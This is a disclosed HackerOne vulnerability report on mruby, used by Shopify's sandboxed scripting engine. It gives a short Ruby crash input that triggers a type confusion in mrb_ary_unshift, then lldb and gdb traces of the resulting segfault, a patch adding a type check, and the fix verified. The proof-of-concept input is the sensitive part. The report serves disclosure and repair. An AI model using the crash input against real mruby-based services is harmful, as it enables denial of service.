# Invalid memory access while freeing memory, caused by invalid type passed to mrb_ary_unshift

## Report Details
- **Report ID**: 183696
- **URL**: https://hackerone.com/reports/183696
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-11-21T04:57:52.137Z
- **Disclosed**: 2016-12-17T20:51:10.069Z

## Reporter
- **Username**: haquaman
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Hi,

Phew, this was a tricky one as the cause wasn't next door to where the dereference happened!

The file causing this is:
```
a *case
  when nil
  redo
end
```

```
$ ./dev/bin/mruby --version
mruby 1.2.0 (2015-11-17)
```

```
$ ./dev/bin/mruby crash.rb
crash.rb:1:3: '*' interpreted as argument prefix
trace:
        [0] crash.rb:3
crash.rb:3: undefined method 'a' for main (NoMethodError)
Segmentation fault: 11
```

```
(lldb) target create "./dev/bin/mruby"
Current executable set to './dev/bin/mruby' (x86_64).
(lldb) settings set -- target.run-args  "crash.rb"
(lldb) r
Process 47144 launched: './dev/bin/mruby' (x86_64)
crash.rb:1:3: '*' interpreted as argument prefix
trace:
	[0] crash.rb:3
crash.rb:3: undefined method 'a' for main (NoMethodError)
Process 47144 stopped
* thread #1: tid = 0x5aab878, 0x0000000100037533 mruby`kh_destroy_iv + 35, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x19)
    frame #0: 0x0000000100037533 mruby`kh_destroy_iv + 35
mruby`kh_destroy_iv:
->  0x100037533 <+35>: movq   0x18(%rax), %rax
    0x100037537 <+39>: movq   %rax, %rsi
    0x10003753a <+42>: callq  0x100017740               ; mrb_free
    0x10003753f <+47>: movq   -0x8(%rbp), %rdi
(lldb) bt
* thread #1: tid = 0x5aab878, 0x0000000100037533 mruby`kh_destroy_iv + 35, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x19)
  * frame #0: 0x0000000100037533 mruby`kh_destroy_iv + 35
    frame #1: 0x0000000100037d9d mruby`iv_free + 29
    frame #2: 0x0000000100037e90 mruby`mrb_gc_free_iv + 48
    frame #3: 0x0000000100017a76 mruby`obj_free + 86
    frame #4: 0x00000001000179e7 mruby`free_heap + 135
    frame #5: 0x0000000100017dfd mruby`mrb_gc_destroy + 29
    frame #6: 0x000000010002b2a2 mruby`mrb_close + 210
    frame #7: 0x0000000100001475 mruby`cleanup + 133
    frame #8: 0x0000000100000e6b mruby`main + 1147
    frame #9: 0x00007fff8a9db5ad libdyld.dylib`start + 1
    frame #10: 0x00007fff8a9db5ad libdyld.dylib`start + 1
(lldb register read
General Purpose Registers:
       rax = 0x0000000000000001
       rbx = 0x0000000000000000
       rcx = 0x0000000000000006
       rdx = 0x0000000100017a66  mruby`obj_free + 70
       rdi = 0x0000000100300390
       rsi = 0x0000000000000001
       rbp = 0x00007fff5fbfd870
       rsp = 0x00007fff5fbfd860
        r8 = 0x000000000000000d
        r9 = 0x000000010030f950
       r10 = 0x00000000013292e2
       r11 = 0x0000000100300000
       r12 = 0x0000000000000000
       r13 = 0x0000000000000000
       r14 = 0x0000000000000000
       r15 = 0x0000000000000000
       rip = 0x0000000100037533  mruby`kh_destroy_iv + 35
    rflags = 0x0000000000010202
        cs = 0x000000000000002b
        fs = 0x0000000000000000
        gs = 0x0000000000000000

(lldb) q
Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y
```

The cause for this was that a non-array type was getting passed to `mrb_ary_unshift`, which then treated it like an `RArray` struct, and incremented the `len`, which accidentally incremented the `iv` field on the `RObject` struct it actually was. This was then used when trying to free the object in `mrb_gc_free_iv`, which just checks `if (obj->iv)` (`src/variable.c:435`), which is true (it is `0x01`), so calls `iv_free` (`src/variable.c:385`), which dereferences the table which is an invalid memory address of `0x01`.

To show this in action, here is a gdb output with symbols (on a different system). I started the program and ran til the crash, then went up the stack until we could see the parent `obj` struct, then set a watchpoint on the `iv` field. Restarted, then continued until the `iv` field was set to `0x0` again, then set a breakpoint for `mrb_ary_unshift`. Stepped through until the `a` variable wasn't "optimized out" (happens on my fuzzing box due to setup), and then set a watchpoint on `a->len`, then continued. It stops showing both the `iv` and the `len` value changes to 1 at the same time showing the bug.

```
$ gdb --args ./bin/mruby crash.rb
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./bin/mruby...done.
(gdb) r
Starting program: /root/mruby-fixes/bin/mruby crash.rb
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
crash.rb:1:3: '*' interpreted as argument prefix
trace:
        [0] crash.rb:3
crash.rb:3: undefined method 'a' for main (NoMethodError)

Program received signal SIGSEGV, Segmentation fault.
0x00000000004cd59c in kh_destroy_iv (h=0x1, mrb=0x602e0001fc60)
    at /root/mruby-fixes/src/variable.c:292
292     KHASH_DEFINE(iv, mrb_sym, mrb_value, TRUE, kh_int_hash_func, kh_int_hash_equal)
(gdb) up
#1  iv_free (t=0x1, mrb=0x602e0001fc60) at /root/mruby-fixes/src/variable.c:387
387       kh_destroy(iv, mrb, &t->h);
(gdb)
#2  mrb_gc_free_iv (mrb=0x602e0001fc60, obj=0x609a00007870)
    at /root/mruby-fixes/src/variable.c:436
436         iv_free(mrb, obj->iv);
(gdb) watch -location obj->iv
Hardware watchpoint 1: -location obj->iv
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /root/mruby-fixes/bin/mruby crash.rb
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Hardware watchpoint 1: -location obj->iv

Old value = <unreadable>
New value = (struct iv_tbl *) 0x0
memset () at ../sysdeps/x86_64/memset.S:94
94      ../sysdeps/x86_64/memset.S: No such file or directory.
(gdb) c
Continuing.
Hardware watchpoint 1: -location obj->iv

Old value = (struct iv_tbl *) 0x0
New value = (struct iv_tbl *) 0x609a00007840
add_heap (gc=0x602e0001fd38, mrb=0x609a00000400) at /root/mruby-fixes/src/gc.c:328
328       for (p = objects(page), e=p+MRB_HEAP_PAGE_SIZE; p<e; p++) {
(gdb) c
Continuing.
Hardware watchpoint 1: -location obj->iv

Old value = (struct iv_tbl *) 0x609a00007840
New value = (struct iv_tbl *) 0x0
mrb_obj_alloc (mrb=mrb@entry=0x602e0001fc60, ttype=ttype@entry=MRB_TT_OBJECT,
    cls=0x609a0000c3d0) at /root/mruby-fixes/src/gc.c:500
500       *(RVALUE *)p = RVALUE_zero;
(gdb) break mrb_ary_unshift
Breakpoint 2 at 0x41e000: file /root/mruby-fixes/src/array.c, line 485.
(gdb) c
Continuing.
crash.rb:1:3: '*' interpreted as argument prefix

Breakpoint 2, mrb_ary_unshift (mrb=mrb@entry=0x602e0001fc60, self=..., item=...)
    at /root/mruby-fixes/src/array.c:485
485     {
(gdb) n
<snip while getting to a point where a isn't "optimized out">
mrb_ary_unshift (mrb=mrb@entry=0x602e0001fc60, self=..., item=...)
    at /root/mruby-fixes/src/array.c:496
496         if (a->aux.capa < a->len + 1)
(gdb) p *a
$1 = {tt = MRB_TT_OBJECT, color = 1, flags = 0, c = 0x609a00007840,
  gcnext = 0x609a0000c3d0, len = 0, aux = {capa = 0, shared = 0x0}, ptr = 0x0}
(gdb) watch -location a->len
Hardware watchpoint 3: -location a->len
(gdb) c
Continuing.
Hardware watchpoint 1: -location obj->iv

Old value = (struct iv_tbl *) 0x0
New value = (struct iv_tbl *) 0x1
Hardware watchpoint 3: -location a->len

Old value = 0
New value = 1
mrb_ary_unshift (mrb=mrb@entry=0x602e0001fc60, self=..., item=...)
    at /root/mruby-fixes/src/array.c:502
502       mrb_field_write_barrier_value(mrb, (struct RBasic*)a, item);
(gdb) d br
Delete all breakpoints? (y or n) y
(gdb) c
Continuing.
trace:
        [0] crash.rb:3
crash.rb:3: undefined method 'a' for main (NoMethodError)

Program received signal SIGSEGV, Segmentation fault.
0x00000000004cd59c in kh_destroy_iv (h=0x1, mrb=0x602e0001fc60)
    at /root/mruby-fixes/src/variable.c:292
292     KHASH_DEFINE(iv, mrb_sym, mrb_value, TRUE, kh_int_hash_func, kh_int_hash_equal)
(gdb) q
A debugging session is active.

        Inferior 1 [process 31010] will be killed.

Quit anyway? (y or n) y

```

A fix for this would be similar as follows:

```
diff --git a/src/array.c b/src/array.c
index 838f6e4..bd44c7f 100644
--- a/src/array.c
+++ b/src/array.c
@@ -483,6 +483,11 @@ mrb_ary_shift(mrb_state *mrb, mrb_value self)
 MRB_API mrb_value
 mrb_ary_unshift(mrb_state *mrb, mrb_value self, mrb_value item)
 {
+  if (!mrb_array_p(self)) {
+    mrb_raisef(mrb, E_TYPE_ERROR, "expecting Array, got %S", mrb_obj_value(mrb_obj_class(mrb, self)));
+    return mrb_nil_value();
+  }
+
   struct RArray *a = mrb_ary_ptr(self);
 
   if (ARY_SHARED_P(a)
```

As mentioned above, this affects mruby-engine:

```
./bin/sandbox:20:in `sandbox_eval': undefined method 'a' for main (MRubyEngine::EngineRuntimeError)
	from ./bin/sandbox:20:in `<main>'
./bin/sandbox: [BUG] Segmentation fault at 0x00000000000019
ruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin15]

-- Crash Report log information --------------------------------------------
   See Crash Report log file under the one of following:
     * ~/Library/Logs/CrashReporter
     * /Library/Logs/CrashReporter
     * ~/Library/Logs/DiagnosticReports
     * /Library/Logs/DiagnosticReports
   for more details.
Don't forget to include the above Crash Report log file in bug reports.

-- Control frame information -----------------------------------------------
c:0001 p:0000 s:0002 E:0013d0 (none) [FINISH]


-- Machine register context ------------------------------------------------
 rax: 0x0000000000000108 rbx: 0x0000000000000001 rcx: 0x00000001017eca32
 rdx: 0x00000001017ecbe0 rdi: 0x00000001018fc440 rsi: 0x0000000101903d30
 rbp: 0x00007fff5ed50660 rsp: 0x00007fff5ed50650  r8: 0x0000000101929e70
  r9: 0x000000010191cad0 r10: 0x000000010191c830 r11: 0x00007fd4ad300000
 r12: 0x0000000101903d30 r13: 0x0000000000000000 r14: 0x00000001018fc440
 r15: 0x00000001018fc920 rip: 0x00000001018034f3 rfl: 0x0000000000010202

-- C level backtrace information -------------------------------------------
0   ruby                                0x000000010104c5d4 rb_vm_bugreport + 388
1   ruby                                0x0000000100eee023 rb_bug_context + 483
2   ruby                                0x0000000100fc1653 sigsegv + 83
3   libsystem_platform.dylib            0x00007fff9826d52a _sigtramp + 26
4   mruby_engine.bundle                 0x00000001018034f3 mrb_gc_free_iv + 19
5   ???                                 0x0000000101903d30 0x0 + 4321197360

-- Other runtime information -----------------------------------------------

* Loaded script: ./bin/sandbox

* Loaded features:

    0 enumerator.so
    1 thread.rb
    2 rational.so
    3 complex.so
<snip various gems>
  185 /Users/<snip>/mruby-engine/lib/mruby_engine/mruby_engine.bundle
  186 /Users/<snip>/mruby-engine/lib/mruby_engine.rb

[NOTE]
You may have encountered a bug in the Ruby interpreter or extension libraries.
Bug reports are welcome.
For details: http://www.ruby-lang.org/bugreport.html

```

Applying the patch above to `ext/mruby_engine/mruby` and recompiling fixes the issue.

```
$ ./bin/mruby ../crash.rb
../crash.rb:1:3: '*' interpreted as argument prefix
trace:
        [0] ../crash.rb:3
TypeError: expecting Array, got Object
```

```
$ ./bin/sandbox crash.rb
./bin/sandbox:20:in `sandbox_eval': expecting Array, got Object (MRubyEngine::EngineRuntimeError)
        from ./bin/sandbox:20:in `<main>'
```

Cheers,

Hugh

## Attachments
No attachments
